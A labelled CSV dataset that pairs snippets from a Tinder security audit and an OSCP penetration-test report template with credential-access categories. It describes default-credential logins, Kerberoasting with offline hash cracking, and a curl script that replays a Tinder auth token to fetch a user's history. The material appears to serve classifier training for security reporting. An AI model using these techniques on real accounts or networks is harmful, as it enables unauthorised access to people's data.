text,label
The code to prompt the user if they want to migrate always runs due to a logic bug. Not a security issue.,Background Information
Tinder Security Audit,Background Information
SSN Project 2013,Background Information
Joris Claassen Leendert v. Duijn Mick Pouw Esan Wit,Background Information
"{Joris.Claassen,Leendert.vanDuijn,Mick.Pouw,Esan.Wit}@os3.nl",Background Information
"Dating apps are common place in society. Many dating apps include the option to contact matched users and send text messages or images. Due to the amount of personal information potentially involved in the matchmaking process this a prime target for identity theft. If an app or service deals with personal information, it has to ensure the security of this private information. Since the Tinder application has a lot of users, it would be interesting to check this security.",Background Information
"The user has to supply some information before using the app. This includes a Facebook profile API credentials and eventually even GPS information. The information that can be collected from the Facebook profile could be valuable for eavesdroppers or third parties. Information like GPS, the actual location of the end user.",Background Information
"In this paper we will look in to the risks of using Tinder, what information is sent where and how securely this information is transported over the internet. We also look into whether information is stored at a third party or even Tinder itself. ",Background Information
 We will first discuss the materials and methods we used to research the Tinder application. We will then discuss the analysis we did on the Tinder application. eg. The offline and onlineanalysis. We will discuss certain,Background Information
attacksandpossibleweaknessesoftheTinderimplementation. Wewillthen,Background Information
draw a conclusion based on our results. We divided the research questions into several sub questions. These will be handled in the analysis. The sub,Background Information
 ## Offensive Security OSCP Exam Penetration Test Report The OffSec Lab and Exam penetration test report contains all efforts that were conducted in order to pass the OffSec course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.,Background Information
"The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter",Background Information
"portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting. The student will be required to fill out this penetration testing report fully and to include the following sections: - Overall High-Level Summary and Recommendations (non-technical) - Methodology walkthrough and detailed outline of steps taken - Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.",Background Information
" - Any additional items that were not included John Doe was tasked with performing an internal penetration test towards OffSec Labs. an internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate OffSec",Background Information
"objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to OffSec. When performing the internal penetration test, there were several alarming vulnerabilities that were identified on OffSecs network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During the testing, John",Background Information
"### Information Gathering

The information gathering portion of a penetration test focuses on
identifying the scope of the penetration test. During this penetration
test, John was tasked with exploiting the lab and exam network. The
specific IP addresses were:

**Exam Network**:

- `192.168.X.X`
- `192.168.X.X`
- `192.168.X.X`",Background Information
"The penetration testing portions of the assessment focus heavily on
gaining access to a variety of systems. During this penetration test,
John was able to successfully gain access to 3
out of the 50 systems.",Background Information
### Target #2 - 192.168.x.2,Background Information
**Severity**: Critical,Background Information
Login page accepted admin:admin as default credentials.,"Credential Access - Default, Leaked, or Compromised Credentials"
MySQL service allowed login with root and no password.,"Credential Access - Default, Leaked, or Compromised Credentials"
"While enumerating table data, John was able to successfully extract
the database root account login and password credentials that were
unencrypted that also matched username and password accounts for the
administrative user account on the system and John was able to log in
remotely using RDP. This allowed for a successful breach of the
operating system as well as all data contained on the system.","Credential Access - Default, Leaked, or Compromised Credentials"
"Manual enumeration of FTP allowed anonymous login, where multiple configuration files were found, including credentials.","Credential Access - Default, Leaked, or Compromised Credentials"
Accessed internal documentation from exposed Confluence server using default credentials.,"Credential Access - Default, Leaked, or Compromised Credentials"
The web admin interface for the camera system was accessible via HTTP and used the default vendor credentials (`admin:admin`). These credentials allowed unrestricted configuration changes and full video access.,"Credential Access - Default, Leaked, or Compromised Credentials"
Leveraged Kerberoasting to request service tickets and crack passwords offline.,Credential Access - Kerberoasting
"An attacker with domain access was able to request service tickets for accounts with SPNs. These tickets were then cracked offline using hashcat, exposing cleartext passwords for several service accounts with elevated privileges.",Credential Access - Kerberoasting
"#!/bin/sh
### Replace : With
### 11111111-2222-3333-4444-555555555555 : Currently valid token
### 2000-12-09T14:55:30.356Z : Earliest time the history includes
curl -v ""https://api.gotinder.com/updates"" \
-H ""X-Auth-Token: 11111111-2222-3333-4444-555555555555"" \
-A ""Tinder Android Version 2.0.1"" \
-H ""Content-Type: application/json; charset=utf-8"" \
-d '{""last_activity_date"":""2000-12-09T14:55:30.356Z""}'",Credential Access - Token Misuse Risk
